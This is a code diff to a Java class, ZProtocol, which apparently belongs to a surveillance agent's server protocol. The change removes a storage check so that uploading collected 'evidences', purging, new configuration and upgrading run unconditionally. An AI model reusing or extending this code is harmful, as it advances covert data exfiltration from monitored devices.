@@ -80,7 +80,6 @@ public class ZProtocol extends Protocol {
 
 	/** The random. */
 	SecureRandom random;
-	private boolean haveStorage;
 
 	/*
 	 * (non-Javadoc)
@@ -214,7 +213,7 @@ public class ZProtocol extends Protocol {
 	}
 
 	private void purge(final boolean cap) throws TransportException, ProtocolException {
-		if (cap && haveStorage) {
+		if (cap) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: ***** PURGE *****"); //$NON-NLS-1$
 			}
@@ -236,7 +235,7 @@ public class ZProtocol extends Protocol {
 	 *             the command exception
 	 */
 	private void newConf(final boolean cap) throws TransportException, ProtocolException, CommandException {
-		if (cap && haveStorage) {
+		if (cap) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: ***** NewConf *****"); //$NON-NLS-1$
 			}
@@ -297,7 +296,7 @@ public class ZProtocol extends Protocol {
 	 *             the command exception
 	 */
 	private void upload(final boolean cap) throws TransportException, ProtocolException, CommandException {
-		if (cap && haveStorage) {
+		if (cap) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: ***** Upload *****"); //$NON-NLS-1$
 			}
@@ -322,7 +321,7 @@ public class ZProtocol extends Protocol {
 	 *             the command exception
 	 */
 	private void upgrade(final boolean cap) throws TransportException, ProtocolException, CommandException {
-		if (cap && haveStorage) {
+		if (cap) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: ***** Upgrade *****"); //$NON-NLS-1$
 			}
@@ -378,9 +377,9 @@ public class ZProtocol extends Protocol {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: ***** Log *****"); //$NON-NLS-1$
 		}
-		if (haveStorage) {
-			sendEvidences(Path.logs());
-		}
+
+		sendEvidences(Path.logs());
+
 	}
 
 	/**
@@ -1074,8 +1073,8 @@ public class ZProtocol extends Protocol {
 					}
 					continue;
 				}
-				
-				if (Cfg.PROTOCOL_RESUME  && file.getSize() > 8 * 1024) {
+
+				if (Cfg.PROTOCOL_RESUME && file.getSize() > 8 * 1024) {
 					sendResumeEvidence(file);
 				} else {
 					sendEvidence(file);
